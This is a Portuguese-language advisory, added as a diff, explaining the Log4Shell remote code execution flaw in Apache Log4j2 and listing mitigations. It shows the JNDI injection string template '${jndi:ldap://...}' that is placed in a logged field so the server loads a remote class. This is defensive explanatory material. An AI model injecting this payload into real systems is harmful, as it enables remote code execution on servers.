@@ -1,0 +1,50 @@
+I"�<h1 id="resumo">Resumo:</h1>
+<ul>
+  <li>Esta é uma vulnerabilidade que possibilita a execução remota de código e é simples de explorar;</li>
+  <li>Já existe correção disponível;</li>
+  <li>Muitos WAF podem ter regras habilitadas para possibilitar a mitigação;</li>
+</ul>
+
+<h1 id="qual-o-impacto">Qual o impacto?</h1>
+
+<p>Baseado nas informações dispostas no <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a>, as versões do Apache Log4j2 &lt;= 2.14.1, possuem features JNDI com falhas de segurança que não protegem contra os ataques direcionados ao LDAP e DSN em consumo endpoint remotos. O que possibilita um invasor executar um código remoto manipulando uma mensagem de log gerada pelo log4j2 .</p>
+
+<p>O impacto dessa vulnerabilidade é extremamente grande, visto que o Apache Log4j2 é massivamente utilizado por programadores Java para registro em trilhas de auditoria.</p>
+
+<h1 id="explicando">Explicando:</h1>
+
+<p><img src="assets/images/The.log4j.JNDI.Attack.png" alt="fluxo" /></p>
+
+<p>As versões modernas do Log4J2 permitem pesquisas JNDI, que permitem consultas a interface LDAP e DNS para enriquecimento dos Logs, o que pode acabar permitindo o apontamento ( URI ) para uma classe que pode ser carregada de forma indevida.</p>
+
+<pre><code>log.info(“Usuario logado: {}”, login);
+</code></pre>
+
+<p>Onde o user nesse caso pode ser um apontamento para uma classe remota que será instanciada no momento do ataque.
+Caso o atacante insira o código no campo login o valor</p>
+
+<pre><code>${jndi:ldap://&lt;endereco&gt;:&lt;porta&gt;/&lt;uri&gt;}
+</code></pre>
+
+<p>Quando o valor login é passado como a string acima, o Log4J2 faz uma requisição ao endereço passado e recebe como retorno um objecto ( DN ) que  possui campos que instruem a obtenção da classe remota. Finalmente, o log4j carrega em memória a classe e a executa.</p>
+
+<p>Se a classe apontada for maliciosa um atacante pode no momento a construção da classe executar comandos no ambiente local do servidor, podendo assim executar, por exemplo, um shell reverso ou instalação de malwares.</p>
+
+<h1 id="o-que-pode-ser-feito">O que pode ser feito?</h1>
+
+<ul>
+  <li>Atualizar a biblioteca Apache Log4J para a versão 2.15;</li>
+  <li>Caso tenha um WAF, atualizar as regras do WAF para bloqueio do payload citado;</li>
+  <li>Desabilitar a funcionalidade de pesquisa para servidores remoto do seu log4j formatMsgNoLookups=true</li>
+</ul>
+
+<h1 id="fontes">Fontes:</h1>
+<pre><code>[https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/
+[https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j](https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j)
+[https://www.elastic.co/pt/blog/detecting-log4j2-with-elastic-security](https://www.elastic.co/pt/blog/detecting-log4j2-with-elastic-security)
+[https://www.elastic.co/pt/blog/detecting-log4j2-with-elastic-security](https://www.elastic.co/pt/blog/detecting-log4j2-with-elastic-security)
+[https://www.crowdstrike.com/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/](hhttps://www.crowdstrike.com/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/)
+[https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)
+</code></pre>
+
+:ET
